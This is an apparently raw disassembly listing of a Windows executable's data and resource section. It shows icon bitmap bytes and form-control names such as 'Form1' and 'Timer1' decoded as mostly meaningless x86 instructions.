  4061f2:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4061f3:	d1 a8 53 b1 d8 cb    	shrl   $1,-0x34274ead(%eax)
  4061f9:	3e ad                	lods   %ds:(%esi),%eax
  4061fb:	da e2                	(bad)
  4061fd:	05 76 a2 70 00       	add    $0x70a276,%eax
	...
  40622e:	80 c1 06             	add    $0x6,%cl
  406231:	08 94 cc 7c 38 a6 d4 	or     %dl,-0x2b59c784(%esp,%ecx,8)
  406238:	aa                   	stos   %al,%es:(%edi)
  406239:	59                   	pop    %ecx
  40623a:	b1 d8                	mov    $0xd8,%cl
  40623c:	be 69 b9 db d6       	mov    $0xd6dbb969,%esi
  406241:	7d c4                	jge    0x406207
  406243:	e0 ea                	loopne 0x40622f
  406245:	90                   	nop
  406246:	cd e6                	int    $0xe6
  406248:	fe                   	(bad)
  406249:	60                   	pusha
  40624a:	b9 dd ff 00 65       	mov    $0x6500ffdd,%ecx
  40624f:	8f                   	(bad)
  406250:	7d 04                	jge    0x406256
  406252:	f7 ff                	idiv   %edi
  406254:	02 00                	add    (%eax),%al
	...
  406282:	d9 eb                	fldpi
  406284:	02 00                	add    (%eax),%al
  406286:	bc f1 02 00 00       	mov    $0x2f1,%esp
	...
  4062b7:	00 00                	add    %al,(%eax)
  4062b9:	03 00                	add    (%eax),%eax
  4062bb:	59                   	pop    %ecx
  4062bc:	07                   	pop    %es
  4062bd:	00 40 8f             	add    %al,-0x71(%eax)
  4062c0:	14 00                	adc    $0x0,%al
  4062c2:	51                   	push   %ecx
  4062c3:	a2 21 00 5d ad       	mov    %al,0xad5d0021
  4062c8:	2d 00 6a b2 32       	sub    $0x32b26a00,%eax
  4062cd:	3b 33                	cmp    (%ebx),%esi
  4062cf:	35 01 00 00 00       	xor    $0x1,%eax
  4062d4:	00 00                	add    %al,(%eax)
  4062d6:	00 00                	add    %al,(%eax)
  4062d8:	00 03                	add    %al,(%ebx)
  4062da:	9f                   	lahf
  4062db:	da 01                	fiaddl (%ecx)
  4062dd:	00 8a c1 01 00 8e    	add    %cl,-0x71fffe3f(%edx)
  4062e3:	c6 02 25             	movb   $0x25,(%edx)
  4062e6:	a2 d3 02 5e bb       	mov    %al,0xbb5e02d3
  4062eb:	df 02                	filds  (%edx)
  4062ed:	8b ce                	mov    %esi,%ecx
  4062ef:	e9 02 ff ff ff       	jmp    0x4061f6
  4062f4:	01 ff                	add    %edi,%edi
  4062f6:	ff                   	(bad)
  4062f7:	ff 01                	incl   (%ecx)
  4062f9:	00 00                	add    %al,(%eax)
  4062fb:	00 00                	add    %al,(%eax)
  4062fd:	12 71 95             	adc    -0x6b(%ecx),%dh
  406300:	01 00                	add    %eax,(%eax)
	...
  4063be:	8a bf 01 00 8c c3    	mov    -0x3c73ffff(%edi),%bh
  4063c4:	02 00                	add    (%eax),%al
  4063c6:	8f c8 02 00          	(bad)
  4063ca:	8e c7                	mov    %edi,%es
  4063cc:	02 00                	add    (%eax),%al
	...
  40651a:	00 00                	add    %al,(%eax)
  40651c:	00 ff                	add    %bh,%bh
  40651e:	ff                   	(bad)
  40651f:	ff                   	(bad)
  406520:	ff                   	(bad)
  406521:	ff                   	(bad)
  406522:	ff                   	(bad)
  406523:	ff                   	(bad)
  406524:	ff                   	(bad)
  406525:	ff                   	(bad)
  406526:	ff                   	(bad)
  406527:	ff                   	(bad)
  406528:	ff                   	(bad)
  406529:	ff                   	(bad)
  40652a:	ff                   	(bad)
  40652b:	ff                   	(bad)
  40652c:	ff                   	(bad)
  40652d:	f8                   	clc
  40652e:	3f                   	aas
  40652f:	ff                   	(bad)
  406530:	ff f0                	push   %eax
  406532:	01 ff                	add    %edi,%edi
  406534:	ff f0                	push   %eax
  406536:	00 1f                	add    %bl,(%edi)
  406538:	ff f0                	push   %eax
  40653a:	00 01                	add    %al,(%ecx)
  40653c:	ff f0                	push   %eax
  40653e:	00 00                	add    %al,(%eax)
  406540:	3f                   	aas
  406541:	f0 00 00             	lock add %al,(%eax)
  406544:	3f                   	aas
  406545:	f0 00 00             	lock add %al,(%eax)
  406548:	3f                   	aas
  406549:	f0 00 00             	lock add %al,(%eax)
  40654c:	3f                   	aas
  40654d:	f0 00 00             	lock add %al,(%eax)
  406550:	3f                   	aas
  406551:	f0 00 00             	lock add %al,(%eax)
  406554:	3f                   	aas
  406555:	f0 00 00             	lock add %al,(%eax)
  406558:	1f                   	pop    %ds
  406559:	f0 00 00             	lock add %al,(%eax)
  40655c:	1f                   	pop    %ds
  40655d:	f0 00 00             	lock add %al,(%eax)
  406560:	1f                   	pop    %ds
  406561:	f0 00 00             	lock add %al,(%eax)
  406564:	1f                   	pop    %ds
  406565:	e0 00                	loopne 0x406567
  406567:	00 1f                	add    %bl,(%edi)
  406569:	e0 00                	loopne 0x40656b
  40656b:	00 1f                	add    %bl,(%edi)
  40656d:	e0 00                	loopne 0x40656f
  40656f:	00 1f                	add    %bl,(%edi)
  406571:	e0 00                	loopne 0x406573
  406573:	00 1f                	add    %bl,(%edi)
  406575:	e0 00                	loopne 0x406577
  406577:	00 0f                	add    %cl,(%edi)
  406579:	e0 00                	loopne 0x40657b
  40657b:	00 1f                	add    %bl,(%edi)
  40657d:	f0 00 00             	lock add %al,(%eax)
  406580:	3f                   	aas
  406581:	f0 07                	lock pop %es
  406583:	e0 7f                	loopne 0x406604
  406585:	f8                   	clc
  406586:	07                   	pop    %es
  406587:	ff                   	(bad)
  406588:	ff                   	(bad)
  406589:	ff                   	(bad)
  40658a:	ff                   	(bad)
  40658b:	ff                   	(bad)
  40658c:	ff                   	(bad)
  40658d:	ff                   	(bad)
  40658e:	ff                   	(bad)
  40658f:	ff                   	(bad)
  406590:	ff                   	(bad)
  406591:	ff                   	(bad)
  406592:	ff                   	(bad)
  406593:	ff                   	(bad)
  406594:	ff                   	(bad)
  406595:	ff                   	(bad)
  406596:	ff                   	(bad)
  406597:	ff                   	(bad)
  406598:	ff                   	(bad)
  406599:	ff                   	(bad)
  40659a:	ff                   	(bad)
  40659b:	ff                   	(bad)
  40659c:	ff 28                	ljmp   *(%eax)
  40659e:	00 00                	add    %al,(%eax)
  4065a0:	00 10                	add    %dl,(%eax)
  4065a2:	00 00                	add    %al,(%eax)
  4065a4:	00 20                	add    %ah,(%eax)
  4065a6:	00 00                	add    %al,(%eax)
  4065a8:	00 01                	add    %al,(%ecx)
  4065aa:	00 20                	add    %ah,(%eax)
  4065ac:	00 00                	add    %al,(%eax)
  4065ae:	00 00                	add    %al,(%eax)
  4065b0:	00 40 04             	add    %al,0x4(%eax)
	...
  4065d3:	00 00                	add    %al,(%eax)
  4065d5:	03 11                	add    (%ecx),%edx
  4065d7:	16                   	push   %ss
  4065d8:	03 00                	add    (%eax),%eax
  4065da:	06                   	push   %es
  4065db:	08 0f                	or     %cl,(%edi)
  4065dd:	00 03                	add    %al,(%ebx)
  4065df:	05 12 00 00 00       	add    $0x12,%eax
  4065e4:	0d 00 00 00 06       	or     $0x6000000,%eax
  4065e9:	00 00                	add    %al,(%eax)
  4065eb:	00 03                	add    %al,(%ebx)
	...
  406611:	00 00                	add    %al,(%eax)
  406613:	00 21                	add    %ah,(%ecx)
  406615:	00 00                	add    %al,(%eax)
  406617:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40661b:	00 71 00             	add    %dh,0x0(%ecx)
  40661e:	00 00                	add    %al,(%eax)
  406620:	5e                   	pop    %esi
  406621:	00 00                	add    %al,(%eax)
  406623:	00 48 00             	add    %cl,0x0(%eax)
  406626:	00 00                	add    %al,(%eax)
  406628:	37                   	aaa
  406629:	00 03                	add    %al,(%ebx)
  40662b:	05 29 00 03 04       	add    $0x4030029,%eax
  406630:	1e                   	push   %ds
  406631:	00 00                	add    %al,(%eax)
  406633:	00 13                	add    %dl,(%ebx)
  406635:	00 00                	add    %al,(%eax)
  406637:	00 03                	add    %al,(%ebx)
	...
  40664d:	16                   	push   %ss
  40664e:	74 9a                	je     0x4065ea
  406650:	4a                   	dec    %edx
  406651:	1d 6d 8f e3 06       	sbb    $0x6e38f6d,%eax
  406656:	37                   	aaa
  406657:	4e                   	dec    %esi
  406658:	dd 00                	fldl   (%eax)
  40665a:	12 1b                	adc    (%ebx),%bl
  40665c:	d1 00                	roll   $1,(%eax)
  40665e:	00 00                	add    %al,(%eax)
  406660:	bb 00 00 00 a0       	mov    $0xa0000000,%ebx
  406665:	00 00                	add    %al,(%eax)
  406667:	00 88 00 00 00 76    	add    %cl,0x76000000(%eax)
  40666d:	00 00                	add    %al,(%eax)
  40666f:	00 63 00             	add    %ah,0x0(%ebx)
  406672:	00 00                	add    %al,(%eax)
  406674:	4f                   	dec    %edi
  406675:	00 00                	add    %al,(%eax)
  406677:	00 38                	add    %bh,(%eax)
  406679:	00 00                	add    %al,(%eax)
  40667b:	00 0f                	add    %cl,(%edi)
	...
  406689:	00 00                	add    %al,(%eax)
  40668b:	00 02                	add    %al,(%edx)
  40668d:	35 9f c8 b9 75       	xor    $0x75b9c89f,%eax
  406692:	d3 ff                	sar    %cl,%edi
  406694:	ff 5d c6             	lcall  *-0x3a(%ebp)
  406697:	f6 ff                	idiv   %bh
  406699:	4f                   	dec    %edi
  40669a:	b5 e2                	mov    $0xe2,%ch
  40669c:	ff 37                	push   (%edi)
  40669e:	97                   	xchg   %eax,%edi
  40669f:	c0 fc 20             	sar    $0x20,%ah
  4066a2:	71 91                	jno    0x406635
  4066a4:	f4                   	hlt
  4066a5:	0c 44                	or     $0x44,%al
  4066a7:	5b                   	pop    %ebx
  4066a8:	e9 00 1d 2a d7       	jmp    0xd76a83ad
  4066ad:	00 00                	add    %al,(%eax)
  4066af:	00 c1                	add    %al,%cl
  4066b1:	00 00                	add    %al,(%eax)
  4066b3:	00 a9 01 02 03 86    	add    %ch,-0x79fcfdff(%ecx)
  4066b9:	00 00                	add    %al,(%eax)
  4066bb:	00 4d 00             	add    %cl,0x0(%ebp)
  4066be:	00 00                	add    %al,(%eax)
  4066c0:	08 00                	or     %al,(%eax)
	...
  4066ca:	00 00                	add    %al,(%eax)
  4066cc:	06                   	push   %es
  4066cd:	24 95                	and    $0x95,%al
  4066cf:	c4 bf 80 d7 f8 fe    	les    -0x1072880(%edi),%edi
  4066d5:	77 d7                	ja     0x4066ae
  4066d7:	f9                   	stc
  4066d8:	fe                   	(bad)
  4066d9:	7e dd                	jle    0x4066b8
  4066db:	fd                   	std
  4066dc:	ff                   	(bad)
  4066dd:	7e e1                	jle    0x4066c0
  4066df:	ff                   	(bad)
  4066e0:	ff                   	(bad)
  4066e1:	78 de                	js     0x4066c1
  4066e3:	ff                   	(bad)
  4066e4:	ff 6b d2             	ljmp   *-0x2e(%ebx)
  4066e7:	fa                   	cli
  4066e8:	ff 5a c1             	lcall  *-0x3f(%edx)
  4066eb:	e9 ff 44 a6 cb       	jmp    0xcbe6abef
  4066f0:	fe                   	(bad)
  4066f1:	27                   	daa
  4066f2:	7e a0                	jle    0x406694
  4066f4:	f8                   	clc
  4066f5:	02 1f                	add    (%edi),%bl
  4066f7:	2c d7                	sub    $0xd7,%al
  4066f9:	00 00                	add    %al,(%eax)
  4066fb:	00 75 00             	add    %dh,0x0(%ebp)
  4066fe:	00 00                	add    %al,(%eax)
  406700:	26 00 00             	add    %al,%es:(%eax)
  406703:	00 00                	add    %al,(%eax)
  406705:	9c                   	pushf
  406706:	d9 f1                	fyl2x
  406708:	01 00                	add    %eax,(%eax)
  40670a:	00 00                	add    %al,(%eax)
  40670c:	00 29                	add    %ch,(%ecx)
  40670e:	9a c9 c9 87 de f9 ff 	lcall  $0xfff9,$0xde87c9c9
  406715:	7d e0                	jge    0x4066f7
  406717:	fa                   	cli
  406718:	fe                   	(bad)
  406719:	7f e1                	jg     0x4066fc
  40671b:	fc                   	cld
  40671c:	ff                   	(bad)
  40671d:	7e e1                	jle    0x406700
  40671f:	fb                   	sti
  406720:	ff 80 e1 fb ff 81    	incl   -0x7e00041f(%eax)
  406726:	e1 fb                	loope  0x406723
  406728:	fe 85 e4 fc ff 89    	incb   -0x7600031c(%ebp)
  40672e:	e9 fb fe 76 e0       	jmp    0xe0b7662e
  406733:	ff                   	(bad)
  406734:	ff 0f                	decl   (%edi)
  406736:	50                   	push   %eax
  406737:	6d                   	insl   (%dx),%es:(%edi)
  406738:	ec                   	in     (%dx),%al
  406739:	00 00                	add    %al,(%eax)
  40673b:	00 84 00 00 00 30 00 	add    %al,0x300000(%eax,%eax,1)
  406742:	00 00                	add    %al,(%eax)
  406744:	02 00                	add    (%eax),%al
  406746:	00 00                	add    %al,(%eax)
  406748:	00 00                	add    %al,(%eax)
  40674a:	00 00                	add    %al,(%eax)
  40674c:	00 37                	add    %dh,(%edi)
  40674e:	a1 cd d5 8f e3       	mov    0xe38fd5cd,%eax
  406753:	f9                   	stc
  406754:	ff 8a ec fc ff 8b    	decl   -0x74000314(%edx)
  40675a:	ec                   	in     (%dx),%al
  40675b:	fe                   	(bad)
  40675c:	ff 8b ed fe ff 8a    	decl   -0x75000113(%ebx)
  406762:	ec                   	in     (%dx),%al
  406763:	fd                   	std
  406764:	ff 8a ec fd ff 89    	decl   -0x76000214(%edx)
  40676a:	eb fd                	jmp    0x406769
  40676c:	ff 89 e9 f8 fe 81    	decl   -0x7e010717(%ecx)
  406772:	e7 fd                	out    %eax,$0xfd
  406774:	ff 20                	jmp    *(%eax)
  406776:	69 88 f2 0d 0d 0d 93 	imul   $0x93,0xd0d0df2(%eax),%ecx
  40677d:	00 00 00 
  406780:	3c 00                	cmp    $0x0,%al
  406782:	00 00                	add    %al,(%eax)
  406784:	07                   	pop    %es
  406785:	00 00                	add    %al,(%eax)
  406787:	00 00                	add    %al,(%eax)
  406789:	33 33                	xor    (%ebx),%esi
  40678b:	33 0a                	xor    (%edx),%ecx
  40678d:	46                   	inc    %esi
  40678e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40678f:	d3 dc                	rcr    %cl,%esp
  406791:	93                   	xchg   %eax,%ebx
  406792:	e8 f8 ff 92 f5       	call   0xf5d3678f
  406797:	fb                   	sti
  406798:	ff 91 f5 fd ff 93    	call   *-0x6c00020b(%ecx)
  40679e:	f6 fe                	idiv   %dh
  4067a0:	ff 93 f7 fe ff 93    	call   *-0x6c000109(%ebx)
  4067a6:	f7 fe                	idiv   %esi
  4067a8:	ff 92 f6 fe ff 92    	call   *-0x6d00010a(%edx)
  4067ae:	f4                   	hlt
  4067af:	fa                   	cli
  4067b0:	ff 8f f3 fd ff 39    	decl   0x39fffdf3(%edi)
  4067b6:	88 a5 f7 00 00 00    	mov    %ah,0xf7(%ebp)
  4067bc:	a3 00 00 00 48       	mov    %eax,0x48000000
  4067c1:	00 00                	add    %al,(%eax)
  4067c3:	00 0e                	add    %cl,(%esi)
  4067c5:	00 00                	add    %al,(%eax)
  4067c7:	00 00                	add    %al,(%eax)
  4067c9:	78 78                	js     0x406843
  4067cb:	78 11                	js     0x4067de
  4067cd:	52                   	push   %edx
  4067ce:	ac                   	lods   %ds:(%esi),%al
  4067cf:	d7                   	xlat   %ds:(%ebx)
  4067d0:	e6 a4                	out    %al,$0xa4
  4067d2:	ea f7 ff ae fa fd ff 	ljmp   $0xfffd,$0xfaaefff7
  4067d9:	a8 fc                	test   $0xfc,%al
  4067db:	ff                   	(bad)
  4067dc:	ff a2 fc ff ff a0    	jmp    *-0x5f000004(%edx)
  4067e2:	fb                   	sti
  4067e3:	fe                   	(bad)
  4067e4:	ff a2 fd ff ff a1    	jmp    *-0x5e000003(%edx)
  4067ea:	fb                   	sti
  4067eb:	ff                   	(bad)
  4067ec:	ff a0 fc fd ff a2    	jmp    *-0x5d000204(%eax)
  4067f2:	fb                   	sti
  4067f3:	ff                   	(bad)
  4067f4:	ff 54 a2 bf          	call   *-0x41(%edx,%eiz,4)
  4067f8:	fc                   	cld
  4067f9:	01 00                	add    %eax,(%eax)
  4067fb:	00 b3 00 00 00 55    	add    %dh,0x55000000(%ebx)
  406801:	00 02                	add    %al,(%edx)
  406803:	03 13                	add    (%ebx),%edx
  406805:	00 00                	add    %al,(%eax)
  406807:	00 00                	add    %al,(%eax)
  406809:	07                   	pop    %es
  40680a:	37                   	aaa
  40680b:	5e                   	pop    %esi
  40680c:	1a 6a bf             	sbb    -0x41(%edx),%ch
  40680f:	e1 ed                	loope  0x4067fe
  406811:	79 cf                	jns    0x4067e2
  406813:	ec                   	in     (%dx),%al
  406814:	ff 9b db ee ff a9    	lcall  *-0x56001125(%ebx)
  40681a:	e5 f4                	in     $0xf4,%eax
  40681c:	ff c5                	inc    %ebp
  40681e:	f6 fc                	idiv   %ah
  406820:	ff c8                	dec    %eax
  406822:	fd                   	std
  406823:	ff                   	(bad)
  406824:	ff c1                	inc    %ecx
  406826:	fd                   	std
  406827:	ff                   	(bad)
  406828:	ff                   	(bad)
  406829:	be fc ff ff bc       	mov    $0xbcfffffc,%esi
  40682e:	fb                   	sti
  40682f:	fc                   	cld
  406830:	ff b5 f9 fd ff 73    	push   0x73fffdf9(%ebp)
  406836:	b9 d4 ff 00 05       	mov    $0x500ffd4,%ecx
  40683b:	0a c0                	or     %al,%al
  40683d:	00 00                	add    %al,(%eax)
  40683f:	00 5d 00             	add    %bl,0x0(%ebp)
  406842:	0b 10                	or     (%eax),%edx
  406844:	13 00                	adc    (%eax),%eax
  406846:	00 00                	add    %al,(%eax)
  406848:	00 00                	add    %al,(%eax)
  40684a:	2b 6a 21             	sub    0x21(%edx),%ebp
  40684d:	8f                   	(bad)
  40684e:	db ef                	fucomi %st(7),%st
  406850:	f5                   	cmc
  406851:	8c f1                	mov    %?,%ecx
  406853:	fb                   	sti
  406854:	ff                   	(bad)
  406855:	7b e3                	jnp    0x40683a
  406857:	f3 ff 74 dd f0       	repz push -0x10(%ebp,%ebx,8)
  40685c:	ff 70 cf             	push   -0x31(%eax)
  40685f:	e8 ff ba e6 f2       	call   0xf3272363
  406864:	ff ce                	dec    %esi
  406866:	f2 f7 fe             	repnz idiv %esi
  406869:	d7                   	xlat   %ds:(%ebx)
  40686a:	f7 f9                	idiv   %ecx
  40686c:	fe                   	(bad)
  40686d:	e1 fa                	loope  0x406869
  40686f:	fa                   	cli
  406870:	fe                   	(bad)
  406871:	d8 f9                	fdivr  %st(1),%st
  406873:	fa                   	cli
  406874:	fe                   	(bad)
  406875:	9d                   	popf
  406876:	d3 e9                	shr    %cl,%ecx
  406878:	ff 00                	incl   (%eax)
  40687a:	17                   	pop    %ss
  40687b:	21 bd 00 00 00 4c    	and    %edi,0x4c000000(%ebp)
  406881:	00 0c 11             	add    %cl,(%ecx,%edx,1)
  406884:	09 00                	or     %eax,(%eax)
  406886:	00 00                	add    %al,(%eax)
  406888:	00 37                	add    %dh,(%edi)
  40688a:	60                   	pusha
  40688b:	8b 18                	mov    (%eax),%ebx
  40688d:	97                   	xchg   %eax,%edi
  40688e:	d9 ed                	fldln2
  406890:	f1                   	int1
  406891:	a9 fb fe ff 95       	test   $0x95fffefb,%eax
  406896:	f8                   	clc
  406897:	fb                   	sti
  406898:	fd                   	std
  406899:	9f                   	lahf
  40689a:	f8                   	clc
  40689b:	fb                   	sti
  40689c:	fe                   	(bad)
  40689d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40689e:	f4                   	hlt
  40689f:	fc                   	cld
  4068a0:	ff                   	(bad)
  4068a1:	7e d1                	jle    0x406874
  4068a3:	ea ff 8a d9 ed ff 89 	ljmp   $0x89ff,$0xedd98aff
  4068aa:	d6                   	salc
  4068ab:	ec                   	in     (%dx),%al
  4068ac:	ff 9a dc ef ff 9e    	lcall  *-0x61001024(%edx)
  4068b2:	dc ef                	fsubr  %st,%st(7)
  4068b4:	ff                   	(bad)
  4068b5:	7e be                	jle    0x406875
  4068b7:	d9 fe                	fsin
  4068b9:	05 3b 50 90 00       	add    $0x90503b,%eax
  4068be:	00 00                	add    %al,(%eax)
  4068c0:	23 06                	and    (%esi),%eax
  4068c2:	29 37                	sub    %esi,(%edi)
  4068c4:	01 00                	add    %eax,(%eax)
  4068c6:	00 00                	add    %al,(%eax)
  4068c8:	00 00                	add    %al,(%eax)
  4068ca:	00 00                	add    %al,(%eax)
  4068cc:	01 4b a9             	add    %ecx,-0x57(%ebx)
  4068cf:	d0 88 a3 e5 f3 ff    	rorb   $1,-0xc1a5d(%eax)
  4068d5:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4068d6:	f0 f8                	lock clc
  4068d8:	ff ad ef f8 ff 59    	ljmp   *0x59fff8ef(%ebp)
  4068de:	92                   	xchg   %eax,%edx
  4068df:	ab                   	stos   %eax,%es:(%edi)
  4068e0:	cd 5a                	int    $0x5a
  4068e2:	7e 8d                	jle    0x406871
  4068e4:	6a 4c                	push   $0x4c
  4068e6:	9b                   	fwait
  4068e7:	b9 77 64 b4 cf       	mov    $0xcfb46477,%ecx
  4068ec:	8e 6b bd             	mov    -0x43(%ebx),%gs
  4068ef:	d6                   	salc
  4068f0:	b0 4a                	mov    $0x4a,%al
  4068f2:	af                   	scas   %es:(%edi),%eax
  4068f3:	d1 ca                	ror    $1,%edx
  4068f5:	00 40 5f             	add    %al,0x5f(%eax)
  4068f8:	5e                   	pop    %esi
  4068f9:	00 0b                	add    %cl,(%ebx)
  4068fb:	10 16                	adc    %dl,(%esi)
  4068fd:	00 00                	add    %al,(%eax)
  4068ff:	00 03                	add    %al,(%ebx)
	...
  40690d:	00 81 bb 02 1d 7f    	add    %al,0x7f1d02bb(%ecx)
  406913:	b1 38                	mov    $0x38,%cl
  406915:	4f                   	dec    %edi
  406916:	93                   	xchg   %eax,%ebx
  406917:	b5 5c                	mov    $0x5c,%ch
  406919:	42                   	inc    %edx
  40691a:	91                   	xchg   %eax,%ecx
  40691b:	b6 74                	mov    $0x74,%dh
  40691d:	00 2d 42 2c 00 00    	add    %ch,0x2c42
  406923:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406926:	00 00                	add    %al,(%eax)
  406928:	06                   	push   %es
  406929:	00 00                	add    %al,(%eax)
  40692b:	00 09                	add    %cl,(%ecx)
  40692d:	00 00                	add    %al,(%eax)
  40692f:	00 08                	add    %cl,(%eax)
	...
  406951:	00 00                	add    %al,(%eax)
  406953:	00 02                	add    %al,(%edx)
  406955:	00 00                	add    %al,(%eax)
  406957:	00 08                	add    %cl,(%eax)
  406959:	00 00                	add    %al,(%eax)
  40695b:	00 0b                	add    %cl,(%ebx)
  40695d:	00 00                	add    %al,(%eax)
  40695f:	00 0a                	add    %cl,(%edx)
  406961:	0d 22 2a 0a 1b       	or     $0x1b0a2a22,%eax
  406966:	97                   	xchg   %eax,%edi
  406967:	c9                   	leave
  406968:	03 8f d3 ec 03 f8    	add    -0x7fc132d(%edi),%ecx
  40696e:	ff                   	(bad)
  40696f:	ff 02                	incl   (%edx)
  406971:	ff                   	(bad)
  406972:	ff                   	(bad)
  406973:	ff 01                	incl   (%ecx)
	...
  406999:	4e                   	dec    %esi
  40699a:	8c a5 04 06 39 4e    	mov    %fs,0x4e390604(%ebp)
  4069a0:	03 00                	add    (%eax),%eax
	...
  4069c2:	00 00                	add    %al,(%eax)
  4069c4:	00 ff                	add    %bh,%bh
  4069c6:	ff 00                	incl   (%eax)
  4069c8:	00 f1                	add    %dh,%cl
  4069ca:	ff 00                	incl   (%eax)
  4069cc:	00 e0                	add    %ah,%al
  4069ce:	1f                   	pop    %ds
  4069cf:	00 00                	add    %al,(%eax)
  4069d1:	c0 07 00             	rolb   $0x0,(%edi)
  4069d4:	00 c0                	add    %al,%al
  4069d6:	03 00                	add    (%eax),%eax
  4069d8:	00 c0                	add    %al,%al
  4069da:	03 00                	add    (%eax),%eax
  4069dc:	00 c0                	add    %al,%al
  4069de:	03 00                	add    (%eax),%eax
  4069e0:	00 c0                	add    %al,%al
  4069e2:	03 00                	add    (%eax),%eax
  4069e4:	00 c0                	add    %al,%al
  4069e6:	01 00                	add    %eax,(%eax)
  4069e8:	00 c0                	add    %al,%al
  4069ea:	01 00                	add    %eax,(%eax)
  4069ec:	00 c0                	add    %al,%al
  4069ee:	03 00                	add    (%eax),%eax
  4069f0:	00 c0                	add    %al,%al
  4069f2:	03 00                	add    (%eax),%eax
  4069f4:	00 c0                	add    %al,%al
  4069f6:	07                   	pop    %es
  4069f7:	00 00                	add    %al,(%eax)
  4069f9:	f3 ff 00             	repz incl (%eax)
  4069fc:	00 ff                	add    %bh,%bh
  4069fe:	ff 00                	incl   (%eax)
  406a00:	00 ff                	add    %bh,%bh
  406a02:	ff 00                	incl   (%eax)
  406a04:	00 24 05 00 46 6f 72 	add    %ah,0x726f4600(,%eax,1)
  406a0b:	6d                   	insl   (%dx),%es:(%edi)
  406a0c:	31 00                	xor    %eax,(%eax)
  406a0e:	2e 00 35 00 00 00 00 	add    %dh,%cs:0x0
  406a15:	00 00                	add    %al,(%eax)
  406a17:	00 00                	add    %al,(%eax)
  406a19:	77 10                	ja     0x406a2b
  406a1b:	00 00                	add    %al,(%eax)
  406a1d:	4e                   	dec    %esi
  406a1e:	0c 00                	or     $0x0,%al
  406a20:	00 41 00             	add    %al,0x0(%ecx)
  406a23:	44                   	inc    %esp
  406a24:	00 46 03             	add    %al,0x3(%esi)
  406a27:	ff 01                	incl   (%ecx)
  406a29:	1c 00                	sbb    $0x0,%al
  406a2b:	00 00                	add    %al,(%eax)
  406a2d:	01 04 00             	add    %eax,(%eax,%eax,1)
  406a30:	44                   	inc    %esp
  406a31:	69 72 31 00 11 04 f0 	imul   $0xf0041100,0x31(%edx),%esi
  406a38:	00 68 01             	add    %ch,0x1(%eax)
  406a3b:	2f                   	das
  406a3c:	0d 05 0a 0b 00       	or     $0xb0a05,%eax
  406a41:	00 21                	add    %ah,(%ecx)
  406a43:	00 ff                	add    %bh,%bh
  406a45:	03 24 00             	add    (%eax,%eax,1),%esp
  406a48:	00 80 02 01 00 06    	add    %al,0x6000102(%eax)
  406a4e:	00 54 69 6d          	add    %dl,0x6d(%ecx,%ebp,2)
  406a52:	65 72 31             	gs jb  0x406a86
  406a55:	00 0b                	add    %cl,(%ebx)
  406a57:	01 01                	add    %eax,(%ecx)
  406a59:	00 03                	add    %al,(%ebx)
  406a5b:	e8 03 00 00 07       	call   0x7406a63
  406a60:	88 0e                	mov    %cl,(%esi)
  406a62:	00 00                	add    %al,(%eax)
  406a64:	08 00                	or     %al,(%eax)
  406a66:	00 00                	add    %al,(%eax)
  406a68:	00 ff                	add    %bh,%bh
  406a6a:	02 04 50             	add    (%eax,%edx,2),%al
  406a6d:	00 00                	add    %al,(%eax)
  406a6f:	00 c7                	add    %al,%bh
  406a71:	f4                   	hlt
  406a72:	c7 86 c1 0b 4e 4b 81 	movl   $0x720b2081,0x4b4e0bc1(%esi)
  406a79:	20 0b 72 
  406a7c:	96                   	xchg   %eax,%esi
  406a7d:	e3 2b                	jecxz  0x406aaa
  406a7f:	80 00 00             	addb   $0x0,(%eax)
	...
  406a92:	00 00                	add    %al,(%eax)
  406a94:	10 01                	adc    %al,(%ecx)
	...
  406aaa:	00 00                	add    %al,(%eax)
  406aac:	cc                   	int3
  406aad:	58                   	pop    %eax
  406aae:	00 00                	add    %al,(%eax)
  406ab0:	00 00                	add    %al,(%eax)
  406ab2:	00 00                	add    %al,(%eax)
  406ab4:	a0 11 40 00 4c       	mov    0x4c004011,%al
  406ab9:	00 00                	add    %al,(%eax)
  406abb:	00 01                	add    %al,(%ecx)
  406abd:	00 08                	add    %cl,(%eax)
  406abf:	00 2c 78             	add    %ch,(%eax,%edi,2)
  406ac2:	40                   	inc    %eax
  406ac3:	00 00                	add    %al,(%eax)
  406ac5:	00 00                	add    %al,(%eax)
  406ac7:	00 ff                	add    %bh,%bh
  406ac9:	ff                   	(bad)
  406aca:	ff                   	(bad)
  406acb:	ff                   	(bad)
  406acc:	ff                   	(bad)
  406acd:	ff                   	(bad)
  406ace:	ff                   	(bad)
  406acf:	ff 00                	incl   (%eax)
  406ad1:	00 00                	add    %al,(%eax)
  406ad3:	00 00                	add    %al,(%eax)
  406ad5:	7a 40                	jp     0x406b17
  406ad7:	00 a8 c0 40 00 01    	add    %ch,0x10040c0(%eax)
  406add:	00 00                	add    %al,(%eax)
  406adf:	00 04 6b             	add    %al,(%ebx,%ebp,2)
  406ae2:	40                   	inc    %eax
  406ae3:	00 04 00             	add    %al,(%eax,%eax,1)
  406ae6:	20 00                	and    %al,(%eax)
  406ae8:	00 00                	add    %al,(%eax)
  406aea:	00 00                	add    %al,(%eax)
  406aec:	d4 fe                	aam    $0xfe
  406aee:	56                   	push   %esi
  406aef:	03 f4                	add    %esp,%esi
  406af1:	6a 40                	push   $0x40
  406af3:	00 e4                	add    %ah,%ah
  406af5:	10 40 00             	adc    %al,0x0(%eax)
  406af8:	6c                   	insb   (%dx),%es:(%edi)
  406af9:	8b 40 00             	mov    0x0(%eax),%eax
  406afc:	0e                   	push   %cs
  406afd:	11 40 00             	adc    %eax,0x0(%eax)
  406b00:	14 11                	adc    $0x11,%al
  406b02:	40                   	inc    %eax
  406b03:	00 0c 94             	add    %cl,(%esp,%edx,4)
  406b06:	40                   	inc    %eax
  406b07:	00 ba 0c 94 40 00    	add    %bh,0x40940c(%edx)
  406b0d:	b9 2c 11 40 00       	mov    $0x40112c,%ecx
  406b12:	ff e1                	jmp    *%ecx
  406b14:	01 00                	add    %eax,(%eax)
  406b16:	05 00 2c 78 40       	add    $0x40782c00,%eax
  406b1b:	00 00                	add    %al,(%eax)
  406b1d:	00 00                	add    %al,(%eax)
  406b1f:	00 ff                	add    %bh,%bh
  406b21:	ff                   	(bad)
  406b22:	ff                   	(bad)
  406b23:	ff                   	(bad)
  406b24:	ff                   	(bad)
  406b25:	ff                   	(bad)
